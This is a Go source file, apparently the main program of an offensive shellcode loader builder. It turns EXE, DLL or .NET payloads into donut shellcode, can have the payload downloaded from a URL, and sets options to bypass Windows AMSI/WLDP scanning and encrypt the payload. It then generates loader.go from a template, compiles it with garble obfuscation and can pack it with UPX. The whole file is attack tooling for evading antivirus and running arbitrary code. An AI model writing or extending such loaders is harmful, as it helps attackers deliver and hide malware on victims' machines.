package main

import (
	"flag"
	"io/ioutil"
)

func main() {
	payloadPath := flag.String("payload", "", "EXE/DLL/.NET payload to convert into donut shellcode")
	template := flag.String("tpl", "sc_ct",
		"Loader template to use")
	useGarble := flag.Bool("g", false,
		"Use garble to compile and obfuscate loader.")
	upxPack := flag.Bool("upx", false,
		"Pack final binary with upx.")
	debug := flag.Bool("debug", false,
		"Generate debug builds")
	exitMethod := flag.Int("ex", 1,
		"donut: Exit method 1=exit thread, 2=exit process")
	bypass := flag.Int("bypass", 3,
		"donut: Bypass AMSI/WLDP 1=skip, 2=abort on fail, 3=continue on fail")
	compression := flag.Int("compress", 1,
		"donut: Compress payload 1=disable, 2=LZNT1, 3=Xpress, 4=Xpress Huffman")
	entropy := flag.Int("entropy", 1,
		"donut: Entropy 1=disable, 2=use random names, 3=random names + symmetric encryption")
	parameters := flag.String("arg", "",
		"Arguments passed to donut payload")
	url := flag.String("url", "",
		"donut: URL hosting payload for HTTP delivery")
	noDonut := flag.Bool("no-donut", false,
		"Treats -payload as shellcode, does not use donut to convert it")
	customTpl := flag.Bool("custom", false,
		"-tpl specifies custom template source instead of using built in templates")

	flag.Parse()

	var payload []byte
	var err error
	if *noDonut {
		if *payloadPath == "" {
			flag.Usage()
			return
		}
		payload, err = ioutil.ReadFile(*payloadPath)
		if err != nil {
			panic(err)
		}
	} else {
		if *payloadPath == "" && *url == "" {
			flag.Usage()
			return
		} else if *payloadPath != "" && *url == "" {
			payload, err = GenerateDonutShellcode(*payloadPath,
				*entropy,
				*compression,
				*bypass,
				*exitMethod,
				*parameters)
		} else if *payloadPath == "" && *url != "" {
			payload, err = GenerateDonutShellcodeURLDownload(*url,
				*entropy,
				*compression,
				*bypass,
				*exitMethod,
				*parameters)
		} else if *payloadPath != "" && *url != "" {
			pe, err := ioutil.ReadFile(*payloadPath)
			if err != nil {
				panic(err)
			}
			payload, err = GenerateDonutShellcodeURL(pe,
				*url,
				*entropy,
				*compression,
				*bypass,
				*exitMethod,
				*parameters)
		}
	}

	if err != nil {
		panic(err)
	}

	src, err := CreateLoader(payload, *template, *debug, *customTpl)
	if err != nil {
		panic(err)
	}
	err = ioutil.WriteFile("loader.go", src, 0644)
	if err != nil {
		panic(err)
	}
	if *useGarble {
		err = garbleBuild("loader.go")
	} else {
		err = goBuild("loader.go")
	}
	if err != nil {
		panic(err)
	}
	if *upxPack {
		err = upx("loader.exe")
		if err != nil {
			panic(err)
		}
	}
}
